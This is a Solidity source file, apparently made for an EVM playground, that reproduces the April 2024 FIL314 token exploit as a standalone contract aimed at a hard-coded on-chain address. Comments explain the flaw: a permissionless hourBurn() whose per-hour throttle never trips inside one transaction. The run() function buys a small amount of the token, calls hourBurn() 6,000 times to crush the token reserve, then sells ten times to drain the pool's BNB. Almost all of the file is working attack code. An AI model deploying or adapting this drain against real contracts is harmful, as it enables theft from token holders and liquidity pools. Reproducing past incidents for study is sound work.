// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-04-FIL314).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (test/FIL314_exp.sol: `contract FIL314 is Test { ... testExploit() { ... } }`,
// with a `fallback() external payable {}` to receive BNB) — there is no standalone
// attack contract to deploy. This contract is a faithful, self-contained copy of
// that inline attack (buy -> hourBurn() x6000 -> sell x10) so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// test/FIL314_exp.sol.
//
// Root cause: FIL314 is an ERC314-style token with a built-in single-sided AMM
// (ethBalance = BNB reserve, _balances[address(this)] = token reserve). Its
// permissionless hourBurn() burns only the token side of the reserve, with a
// throttle that never trips within a single transaction (it compares against a
// frozen block.timestamp), so it can be looped thousands of times in one call.
// Crushing the token reserve while the BNB reserve stays fixed collapses the
// constant-product price, so a handful of subsequent sells drain the BNB reserve.

interface IFIL314 {
    function getAmountOut(uint256 value, bool buy) external returns (uint256);
    function hourBurn() external;
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract FIL314Drain {
    IFIL314 constant FIL314 = IFIL314(0xE8A290c6Fc6Fa6C0b79C9cfaE1878d195aeb59aF);

    // step 0: buy a small amount of FIL314 to seed the pool's BNB side a touch higher.
    function run() external {
        (bool ok, ) = address(FIL314).call{value: 0.05 ether}("");
        require(ok, "buy failed");

        // step 1: crush the token reserve — hourBurn()'s throttle never trips
        // within one transaction (it compares against a frozen block.timestamp),
        // so looping it removes 0.25% of the token reserve per call, 6,000 times.
        for (uint256 i = 0; i < 6000; i++) {
            FIL314.hourBurn();
        }

        // step 2: sell into the now-degenerate pool 10 times. With the token
        // reserve crushed, each sell pulls a large fraction of the BNB reserve.
        for (uint256 i = 0; i < 10; i++) {
            uint256 amount = FIL314.getAmountOut(address(FIL314).balance, true);
            FIL314.transfer(address(FIL314), amount);
        }
    }

    // receives BNB from buy() (via receive()) and sell() (via payable transfer()).
    fallback() external payable {}
    receive() external payable {}
}
